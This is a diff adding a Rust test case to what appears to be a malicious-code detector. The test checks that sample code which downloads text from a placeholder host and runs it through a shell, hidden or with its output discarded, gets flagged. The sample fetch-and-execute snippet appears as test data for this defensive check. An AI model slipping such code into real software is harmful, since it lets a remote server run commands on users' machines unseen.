@@ -376,6 +376,24 @@ fn a_response_unwrapped_is_still_the_response() {
 }
 
 #[test]
+fn code_received_and_run_out_of_sight_says_so() {
+    // GR-8's follow-up: what a server sends, handed to a shell with no window or with its output sent to null
+    let body = |how: &str| {
+        format!(
+            "let s = reqwest::blocking::get(\"https://example.invalid/c\").unwrap().text().unwrap();\nstd::process::Command::new(\"sh\").arg(\"-c\").arg(&s){}.spawn().unwrap();",
+            how
+        )
+    };
+    for how in [".creation_flags(0x08000000)", ".stdout(std::process::Stdio::null())"] {
+        let a = build_body(&body(how));
+        assert!(has(&rs(&a.build), "runs code it receives over the network, out of sight"), "{}: {:?}", how, rs(&a.build));
+    }
+    let a = build_body(&body(""));
+    let r = rs(&a.build);
+    assert!(has(&r, "runs code it receives over the network") && !has(&r, "out of sight"), "{:?}", r);
+}
+
+#[test]
 fn a_download_run_out_of_sight_says_so() {
     // GR-8: a payload downloaded, then run with no window or with its output sent to null
     let body = |how: &str| {
